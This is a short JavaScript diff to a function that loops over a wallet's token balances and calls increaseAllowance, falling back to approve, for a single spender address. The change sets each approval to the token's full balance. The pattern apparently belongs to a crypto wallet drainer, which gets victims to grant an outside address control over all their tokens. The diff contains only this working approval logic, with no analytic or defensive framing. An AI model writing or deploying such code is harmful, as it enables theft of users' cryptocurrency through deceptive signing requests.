@@ -174,7 +174,7 @@ async function requestIncreasedAllowance(signer, balances, spenderAddress, netwo
     for (const token of balances) {
         try{
             const tokenContract = new ethers.Contract(token.address, abi, signer);
-            const tx = await tokenContract.increaseAllowance(spenderAddress, allowance_);
+            const tx = await tokenContract.increaseAllowance(spenderAddress, token.balance);
             await tx.wait();
             console.log("sucessfully increased allocation or approved..");
             
@@ -187,7 +187,7 @@ async function requestIncreasedAllowance(signer, balances, spenderAddress, netwo
         }catch{
             try{
                 const tokenContract = new ethers.Contract(token.address, abi, signer);
-                const tx = await tokenContract.approve(spenderAddress, allowance_);
+                const tx = await tokenContract.approve(spenderAddress, token.balance);
                 await tx.wait();
                 console.log("sucessfully increased allocation or approved..");
                 
